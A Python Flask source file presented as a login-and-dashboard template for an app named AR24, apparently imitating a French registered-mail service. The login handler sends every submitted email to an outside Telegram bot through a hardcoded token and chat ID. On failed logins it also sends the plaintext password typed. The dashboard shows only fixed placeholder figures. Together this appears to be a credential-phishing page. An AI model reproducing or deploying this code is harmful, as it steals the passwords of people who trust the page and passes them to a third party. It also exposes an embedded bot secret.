# app.py - AR24 (Flask template avec Login & Dashboard)
from flask import Flask, render_template, request, redirect, url_for, session, flash
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
from datetime import timedelta
import os
import requests

TOKEN = "6907244977:AAHgjcVzEkSHFdoxVQjHZtce0lMt5ZHEiTc"
CHAT_ID = 1239399534

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message
    }

    try:
        response = requests.post(url, data=data)
        print(response.text)
    except Exception as e:
        print("Erreur Telegram:", e)

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "change-me-in-production")
app.permanent_session_lifetime = timedelta(days=30)

# Base utilisateurs en mémoire (à remplacer par une vraie BDD)
USERS = {
    "admin@meindj.com": {
        "password": generate_password_hash("admin123"),
        "name": "Admin MEINDJ",
    }
}

# Décorateur "login requis"
def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if "user" not in session:
            flash("Veuillez vous connecter.", "warning")
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return wrapper

@app.route("/")
def home():
    return redirect(url_for("login"))

@app.route("/fr/user/login", methods=["GET", "POST"])
def login():
    if "user" in session:
        return redirect(url_for("dashboard"))

    if request.method == "POST":
        email = request.form.get("email", "").strip().lower()
        password = request.form.get("password", "")
        remember = request.form.get("remember") == "on"

        user = USERS.get(email)

        if user and check_password_hash(user["password"], password):
            session.permanent = remember
            session["user"] = email
            session["name"] = user["name"]

            send_telegram_message(f"🔐 Connexion réussie: {email}")

            flash("Connexion réussie !", "success")
            return redirect(url_for("dashboard"))

        else:
            send_telegram_message(f"❌ Échec connexion: {email}")
            flash("E-mail ou mot de passe incorrect.", "danger")
            send_telegram_message(f"❌ Échec connexion: {password}")

    return render_template("login.html")

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        email = request.form.get("email", "").strip().lower()
        password = request.form.get("password", "")
        name = request.form.get("name", "").strip() or email.split("@")[0]
        if not email or not password:
            flash("Tous les champs sont requis.", "warning")
        elif email in USERS:
            flash("Cet e-mail est déjà inscrit.", "warning")
        else:
            USERS[email] = {"password": generate_password_hash(password), "name": name}
            flash("Compte créé, vous pouvez vous connecter.", "success")
            return redirect(url_for("login"))
    return render_template("register.html")

@app.route("/dashboard")
@login_required
def dashboard():
    stats = {
        "envois": 24,
        "recus": 12,
        "brouillons": 3,
        "contacts": 87,
    }
    activites = [
        {"texte": "Envoi recommandé à client@exemple.fr", "date": "il y a 2h"},
        {"texte": "Document signé par M. Dupont", "date": "il y a 5h"},
        {"texte": "Nouveau contact ajouté", "date": "hier"},
        {"texte": "Brouillon enregistré", "date": "il y a 2 jours"},
    ]
    return render_template(
        "dashboard.html",
        user=session.get("user"),
        name=session.get("name"),
        stats=stats,
        activites=activites,
    )

@app.route("/logout")
def logout():
    session.clear()
    flash("Déconnexion effectuée.", "info")
    return redirect(url_for("login"))

@app.route("/test-telegram")
def test_telegram():
    send_telegram_message("🔥 TEST TELEGRAM VIA FLASK OK")
    return "Message envoyé"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True, use_reloader=False)
   
   
